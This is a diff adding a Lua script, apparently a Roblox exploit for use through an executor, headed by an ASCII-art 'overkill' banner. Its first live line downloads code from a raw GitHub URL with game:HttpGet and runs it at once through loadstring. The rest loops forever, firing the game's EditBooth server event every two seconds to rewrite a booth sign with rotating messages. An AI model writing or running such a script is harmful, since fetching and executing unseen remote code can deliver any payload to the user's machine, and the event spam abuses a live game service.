@@ -1,0 +1,28 @@
+--[[
+  ______   ____    ____  _______ .______       __  ___  __   __       __      
+ /  __  \  \   \  /   / |   ____||   _  \     |  |/  / /_ | |  |     |  |     
+|  |  |  |  \   \/   /  |  |__   |  |_)  |    |  '  /   | | |  |     |  |     
+|  |  |  |   \      /   |   __|  |      /     |    <    | | |  |     |  |     
+|  `--'  |    \    /    |  |____ |  |\  \----.|  .  \   | | |  `----.|  `----.
+ \______/      \__/     |_______|| _| `._____||__|\__\  |_| |_______||_______|
+]]
+loadstring(game:HttpGet("https://raw.githubusercontent.com/typical-overk1ll/scripts/main/Invite",true))()
+function msg(text)
+    local A_1 = text
+local A_2 = "booth"
+local event = game:GetService("ReplicatedStorage").Events.EditBooth
+event:FireServer(A_1, A_2)
+end
+while wait(2) do
+    msg("<- Buy from ->")
+    wait(2)
+    msg("<- Me, Pls ->")
+      wait(2)
+    msg("<- Russia stop ->")
+     wait(2)
+    msg("<- =")
+    wait(2)
+    msg("<- ==")
+    wait(2)
+    msg("<- === ->")
+    end
